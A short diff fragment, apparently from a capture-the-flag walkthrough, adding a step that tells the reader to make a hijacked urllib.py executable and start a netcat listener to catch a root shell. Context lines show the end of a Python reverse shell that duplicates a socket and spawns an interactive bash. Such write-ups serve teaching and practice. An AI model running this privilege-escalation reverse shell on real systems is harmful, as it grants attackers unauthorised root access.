@@ -1378,4 +1378,7 @@ dup2(s.fileno(),2)
 run(["/bin/bash","-i"])
 ```
 
-39. 
+39. Give the `urllib.py` execute permissions and start a netcat listener on the port you specified in the python script and we just wait to get our root shell
+
+<img width="656" height="177" alt="image" src="https://github.com/user-attachments/assets/e3ef4b22-83f5-4ac5-9644-66bb51f85b11" />
+
